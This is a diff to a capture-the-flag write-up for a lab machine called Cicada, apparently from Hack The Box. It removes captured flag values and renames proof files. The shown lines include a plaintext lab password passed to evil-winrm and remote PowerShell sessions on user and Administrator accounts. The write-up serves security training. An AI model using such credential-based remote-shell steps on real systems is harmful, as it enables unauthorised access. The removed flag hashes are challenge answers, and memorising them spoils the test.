@@ -1,7 +1,7 @@
 ---
 title: Cicada
 slug: Cicada
-tags: [Windows, SeBackupPrivilege, Vulnerability Research]
+tags: [SeBackupPrivilege, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -215,8 +215,7 @@ We get another creds and we can EvilWinRM with it.
 $ evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
 
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..\Desktop
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
-d0245360de0a686c8fcabb6b0c44d6c0
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -285,8 +284,7 @@ Warning: Remote path completions is disabled due to ruby limitation: quoting_det
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
-b4ad5920b1144568fc7112230e782976
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\privileged-proof.txt
 ```
 
 ---
